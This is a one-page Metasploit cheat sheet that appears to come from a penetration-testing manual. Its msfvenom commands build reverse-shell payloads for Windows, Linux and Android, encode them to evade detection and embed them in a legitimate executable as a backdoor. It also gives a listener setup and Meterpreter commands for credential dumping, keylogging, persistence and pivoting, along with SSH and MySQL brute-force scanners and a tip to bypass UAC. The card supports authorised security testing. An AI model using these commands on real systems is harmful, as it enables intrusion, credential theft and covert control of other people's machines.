# Metasploit Quick Reference Card

One-page cheat sheet. For details, see [the full manual](README.md).

---

## 🔥 Most Common Commands

| Task | Command |
|------|---------|
| Start Metasploit | `msfconsole` |
| Start with database | `msfconsole -d` |
| Search for a module | `search [keyword]` |
| Use a module | `use [module/path]` |
| Show options | `show options` |
| Set a parameter | `set [PARAM] [value]` |
| Set global parameter | `setg [PARAM] [value]` |
| Run the module | `run` or `exploit` |
| Background a session | `background` |
| List sessions | `sessions` |
| Interact with session | `sessions -i [ID]` |
| Kill a session | `sessions -k [ID]` |
| List jobs | `jobs` |
| Kill a job | `jobs -k [ID]` |
| Show all modules | `show [exploits/payloads/auxiliary/post]` |
| Get module info | `info` |
| Check if target is vulnerable | `check` |
| Exit Metasploit | `exit` |

---

## 📦 Payloads (msfvenom)

| Task | Command |
|------|---------|
| List payloads | `msfvenom -l payloads` |
| Windows reverse shell (EXE) | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o shell.exe` |
| Windows reverse shell (PowerShell) | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f psh-reflection -o payload.ps1` |
| Linux reverse shell | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf -o shell.elf` |
| Android reverse shell | `msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -o shell.apk` |
| Encoded payload (basic evasion) | `msfvenom -p [payload] -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe` |
| Embed in legitimate EXE | `msfvenom -p [payload] -x [legit.exe] -f exe -o backdoor.exe` |

---

## 🎯 Multi/Handler (Listener)

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [YOUR_IP]
set LPORT [YOUR_PORT]
set ExitOnSession false
run -j
```

## 📂 Meterpreter Commands
|Category	|Command|
|----|----|
|System	|`sysinfo`, `getuid`, `ps`, `migrate [PID]`|
|File	|`ls`, `cd`, `pwd`, `upload [local] [remote]`, `download [remote] [local]`, `search -f [filename]`|
|Network|	`ipconfig`, `netstat`, `arp` ,`route`|
|Privilege	|`getsystem`, `hashdump`, l`oad kiwi`, `creds_all`|
|Stealth|`screenshot`, `keyscan_start`, `keyscan_dump`, `keyscan_stop`|
|Persistence	|`run persistence -A -X -i 10 -p [PORT] -r [IP]`|
|Pivoting|	`portfwd add -l [local_port] -p [remote_port] -r [remote_ip]`|


## 🧠 Auxiliary Scanners
|Task|	Command|
|----|----|
|TCP port scan	|`use auxiliary/scanner/portscan/tcp`|
|SMB version detection|	`use auxiliary/scanner/smb/smb_version`|
|EternalBlue check	|`use auxiliary/scanner/smb/smb_ms17_010`|
|HTTP directory scanner	|`use auxiliary/scanner/http/dir_scanner`|
|SSH brute force|	`use auxiliary/scanner/ssh/ssh_login`|
|MySQL login brute|	`use auxiliary/scanner/mysql/mysql_login`|


## 🛠️ Database Commands
|Task	|Command|
|----|----|
|Check database status	|`db_status`|
|Create workspace|	`workspace -a [name]`|
|Switch workspace	|`workspace [name]`|
|Import Nmap scan|	`db_import [file.xml]`|
|List hosts	|`hosts`|
|List services|	`services`|
|Set RHOSTS from hosts|	`hosts -R`|
|List credentials|	`creds`|
|Generate HTML report	|`report -f html -o [file.html]`|


## ⚡ Resource Scripts
|Task	|Command|
|----|----|
|Run a resource script|	`msfconsole -r script.rc`|
|Run from inside msfconsole	| `resource script.rc`|
|Auto-run on startup	|Save to `~/.msf4/msfconsole.rc`|



## 🆘 Troubleshooting
|Problem	|Likely Fix|
|----|----|
|No session after payload	|Check LHOST, LPORT, firewall|
|Database not connected	|`sudo systemctl start postgresql`|
|Session not Meterpreter	|`sessions -u [ID]`|
|getsystem fails|	Try UAC bypass first|
|hashdump fails	|`load kiwi; creds_all`|
|Connection drops|	Use `reverse_https` payload|



[📖 Back to full manual](README.md).















